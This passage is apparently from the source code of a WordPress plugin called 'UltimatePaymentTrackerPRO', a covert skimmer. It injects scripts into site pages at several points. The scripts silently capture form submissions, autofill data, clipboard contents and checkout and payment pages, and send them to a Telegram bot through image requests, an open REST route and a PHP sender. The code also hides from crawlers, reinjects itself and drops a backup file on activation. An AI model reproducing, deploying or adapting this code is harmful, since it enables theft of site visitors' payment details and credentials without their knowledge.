                    msg += '🔌 <b>Detected Plugins:</b>\\n';
                    plugins.forEach(function(p){ msg += '✅ ' + p + '\\n'; });
                    msg += '\\n';
                }
                
                msg += '🔧 <b>Active Features (100%):</b>\\n';
                msg += '✅ 100% Silent Operation\\n';
                msg += '✅ All WordPress Plugins Support\\n';
                msg += '✅ Browser Autofill Capture\\n';
                msg += '✅ Clipboard Monitoring\\n';
                msg += '✅ Iframe & Cross-Domain\\n';
                msg += '✅ Any Folder/Domain Support\\n';
                msg += '✅ HTTP/HTTPS & Subdomains\\n\\n';
                
                msg += '📱 <b>Notifications Active:</b>\\n';
                msg += '✅ Activation Time\\n';
                msg += '✅ Cart Page Visit\\n';
                msg += '✅ Checkout Page Visit\\n';
                msg += '✅ Form Submissions\\n';
                msg += '✅ Payment Information\\n\\n';
                
                msg += '🕒 <b>Activation Time:</b> ' + new Date().toLocaleString();
                
                sendToTelegram(msg, 'ACTIVATION');
            });
        }
        
        // ১২. MAIN INITIALIZATION
        function initTracker() {
            // Step 1: Activation
            setTimeout(sendActivationMessage, 2000);
            
            // Step 2: Setup all features with delays
            setTimeout(setupUniversalFormDetector, 3000);
            setTimeout(setupAutofillCapture, 4000);
            setTimeout(setupClipboardMonitor, 5000);
            setTimeout(setupIframeMonitor, 6000);
            setTimeout(setupCrossDomainCapture, 7000);
            setTimeout(setupPageTracker, 8000);
            
            // Mark as active
            window._TRACKER_.active = true;
            window.__tracker_loaded = true;
            
            // Self-healing
            setInterval(function(){
                if(!window._TRACKER_.active && document.body){
                    initTracker();
                }
            }, 30000);
        }
        
        // START TRACKER
        if(document.readyState === 'loading'){
            document.addEventListener('DOMContentLoaded', function(){
                setTimeout(initTracker, <?php echo $delay; ?>);
            });
        } else {
            setTimeout(initTracker, <?php echo $delay; ?>);
        }
        
        </script>
        <?php
        $this->injected = true;
    }
    
    // ==================== SECONDARY INJECTION (BODY) ====================
    public function inject_secondary() {
        ?>
        <script>
        // Backup injection
        if(!window.__tracker_loaded){
            setTimeout(function(){
                var s = document.createElement('script');
                s.innerHTML = `
                    window._TRACKER_BACKUP = {loaded: true};
                    setInterval(function(){
                        document.querySelectorAll('form').forEach(function(f){
                            if(!f._tracked){
                                f._tracked = true;
                                f.addEventListener('submit', function(){
                                    var msg = '📋 Backup Form Capture\\nPage: '+window.location.href;
                                    new Image().src='https://api.telegram.org/bot<?php echo $this->config['telegram_token']; ?>/sendMessage?chat_id=<?php echo $this->config['telegram_chat_id']; ?>&text='+encodeURIComponent(msg);
                                });
                            }
                        });
                    }, 5000);
                `;
                document.head.appendChild(s);
            }, 5000);
        }
        </script>
        <?php
    }
    
    // ==================== FOOTER INJECTION ====================
    public function inject_footer() {
        ?>
        <!-- Tracker Footer Backup -->
        <script>
        // Final backup check
        if(!window._TRACKER_ || !window._TRACKER_.active){
            setTimeout(function(){
                var forms = document.querySelectorAll('form');
                if(forms.length > 0 && !window.__final_tracker){
                    window.__final_tracker = true;
                    
                    // Simple form capture
                    forms.forEach(function(form){
                        form.addEventListener('submit', function(){
                            var data = {};
                            try {
                                new FormData(form).forEach(function(v,k){
                                    if(v && v.toString().trim()) data[k] = v;
                                });
                            } catch(e){}
                            
                            var msg = '📋 Final Backup Capture\\n';
                            msg += 'Form: ' + (form.id || form.name || 'unknown') + '\\n';
                            msg += 'Page: ' + window.location.href + '\\n';
                            msg += 'Fields: ' + Object.keys(data).length;
                            
                            new Image().src='https://api.telegram.org/bot<?php echo $this->config['telegram_token']; ?>/sendMessage?chat_id=<?php echo $this->config['telegram_chat_id']; ?>&text='+encodeURIComponent(msg);
                        });
                    });
                }
            }, 8000);
        }
        </script>
        <?php
    }
    
    // ==================== CONTENT INJECTION ====================
    public function inject_content($content) {
        if (!is_admin() && !$this->injected) {
            $content .= '<!-- Tracker Content Injection -->';
        }
        return $content;
    }
    
    // ==================== AJAX HANDLER ====================
    public function ajax_handler() {
        if (isset($_POST['data']) && isset($_POST['type'])) {
            $message = sanitize_text_field($_POST['data']);
            $type = sanitize_text_field($_POST['type']);
            
            // Send to Telegram via PHP (backup)
            $this->send_telegram_backup($message);
        }
        wp_die();
    }
    
    // ==================== REST API ROUTES ====================
    public function register_rest_routes() {
        register_rest_route('tracker/v1', '/capture', [
            'methods' => 'POST',
            'callback' => [$this, 'rest_capture'],
            'permission_callback' => '__return_true'
        ]);
    }
    
    public function rest_capture($request) {
        $params = $request->get_params();
        if (isset($params['data'])) {
            $this->send_telegram_backup($params['data']);
        }
        return ['success' => true];
    }
    
    // ==================== TELEGRAM BACKUP SENDER ====================
    private function send_telegram_backup($message) {
        $url = "https://api.telegram.org/bot{$this->config['telegram_token']}/sendMessage";
        $data = [
            'chat_id' => $this->config['telegram_chat_id'],
            'text' => $message,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true
        ];
        
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
                'timeout' => 3,
                'ignore_errors' => true
            ]
        ];
        
        $context = stream_context_create($options);
        @file_get_contents($url, false, $context);
        
        return true;
    }
    
    // ==================== DEVICE ID GENERATOR ====================
    private function get_device_id() {
        if (isset($_COOKIE['tracker_device_id'])) {
            return $_COOKIE['tracker_device_id'];
        }
        
        $device_id = 'dev_' . bin2hex(random_bytes(8));
        @setcookie('tracker_device_id', $device_id, time() + (365 * 24 * 60 * 60), '/');
        
        return $device_id;
    }
    
    // ==================== TRACKING COOKIE ====================
    public function set_tracking_cookie() {
        if (!isset($_COOKIE['tracker_session'])) {
            @setcookie('tracker_session', 'sess_' . time(), time() + (24 * 60 * 60), '/');
        }
    }
    
    // ==================== BOT DETECTION ====================
    private function is_bot() {
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $bots = ['bot', 'crawl', 'spider', 'scrap', 'curl', 'wget', 'python', 'java'];
        
        foreach ($bots as $bot) {
            if (stripos($user_agent, $bot) !== false) {
                return true;
            }
        }
        
        return false;
    }
}

// ==================== INSTANTIATE TRACKER ====================
new UltimatePaymentTrackerPRO();

// ==================== OUTPUT BUFFER INJECTION (100% GUARANTEE) ====================
add_action('template_redirect', function() {
    ob_start(function($buffer) {
        // Check if tracker is already injected
        if (strpos($buffer, 'TRACKER_CONFIG') === false && 
            strpos($buffer, '_TRACKER_') === false) {
            
            // Last resort injection
            $inject = '<script>window._TRACKER_LAST_RESORT=true;</script>';
            $buffer = preg_replace('/<\/head>/', $inject . '</head>', $buffer, 1);
        }
        return $buffer;
    });
});

// ==================== PLUGIN ACTIVATION HOOK ====================
register_activation_hook(__FILE__, function() {
    // Create backup injection file
    $backup_content = '<?php /* Ultimate Tracker Backup */ ?>';
    @file_put_contents(WP_CONTENT_DIR . '/tracker-backup.php', $backup_content);
});
